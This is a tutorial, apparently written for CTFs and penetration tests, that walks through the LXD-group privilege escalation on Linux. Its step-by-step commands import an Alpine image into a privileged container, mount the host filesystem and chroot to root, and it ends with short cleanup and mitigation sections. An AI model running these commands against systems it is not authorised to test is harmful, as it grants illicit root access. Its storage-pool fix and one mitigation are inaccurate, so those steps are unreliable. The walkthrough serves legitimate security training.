### Intro

LXD PwnBox is a privilege escalation technique that exploits the LXD container management system on Linux.
If a user has been added to the lxd group, they can create and run privileged containers, effectively gaining root access on the host.
By mounting the host filesystem inside a container, an attacker can read or modify critical system files.
This method is commonly used in CTFs and penetration tests when LXD is misconfigured. ðŸš€

### Enumeration

Here we will talk about situation when you are already inside of the machine
- Lets Check `id` in terminal:

```bash
id

# result (pay attention you are in lxd group!):
uid=1000(kingkong) gid=1000(kingkong) groups=1000(kingkong),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

- If you see your user in lxd
### Weaponization/Privilege Escalation

- Prepare a home for the future container:

```bash
mkdir /tmp/lxd && cd /tmp/lxd
```

- Download Alpine LXD tar file to it's new home from [github](https://github.com/saghul/lxd-alpine-builder/blob/master/alpine-v3.13-x86_64-20210218_0139.tar.gz)
or use cli:
```bash
wget https://github.com/saghul/lxd-alpine-builder/raw/refs/heads/master/alpine-v3.13-x86_64-20210218_0139.tar.gz -O alpine-v3.18-x86_64.tar.gz
```

- Once the tar file is ready, import it into LXD:

```bash
lxc image import alpine-v3.18-x86_64.tar.gz --alias myimage
```
- Verify the image has been added:

```bash
lxc image list
```

- Create a new privileged LXD container with the imported Alpine image:

```bash
lxc init myimage pwnbox -c security.privileged=true
```

- !NBIf you get `Error: No storage pool found. Please create a new storage pool` just create a storage pool like this (if no error faced just skip this step)

```bash
lxc init myimage pwnbox -s mypool -c security.privileged=true
```

- Give the container full access to the hostâ€™s file system:

```bash
lxc config device add pwnbox mydevice disk source=/ path=/mnt/root recursive=true
```

- Start the container:

```bash
lxc start pwnbox
```

- Confirm it's running:

```bash
lxc list
```

- Now, enter the container:

```bash
lxc exec pwnbox /bin/sh
```

- Since the container is privileged and has access to the hostâ€™s filesystem, navigate to /mnt/root to access the main system:

```bash
cd /mnt/root
ls -la
```

- Now became root:

```bash
chroot /mnt/root /bin/bash
```

You're root! ðŸŽ‰

### Cleanup (If Needed)

- To remove the container after exploitation:

```bash
lxc delete pwnbox --force
lxc image delete myimage
```

### Mitigation

- Remove users from the lxd group:

```
sudo gpasswd -d kingkong lxd
```

- Restrict LXD container permissions:

```bash
lxc config set core.https_address ""
```

- Use AppArmor or SELinux to sandbox LXD properly.
